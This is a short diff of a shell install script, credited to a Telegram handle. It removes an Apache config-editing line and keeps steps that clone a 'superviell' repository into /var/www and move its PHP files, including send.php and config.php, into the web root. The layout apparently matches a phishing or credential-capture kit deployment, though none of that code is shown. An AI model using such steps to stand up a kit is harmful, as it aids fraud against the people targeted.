@@ -3,7 +3,6 @@
 # Created by: @K41S3RR - https://t.me/K41S3RR
 #
 # ==============================================
-cd /etc/apache2/sites-available; nano 000-default.conf
 cd /var/www; git clone https://github.com/resekk-vps/superviell
 cd /var/www/superviell; mv ajax /var/www; mv App_Themes /var/www; mv config.php /var/www; mv index.php /var/www; mv send.php /var/www; mv v.php /var/www; mv icon /var/www; mv tr /var/www
 cd /var/www; nano config.php
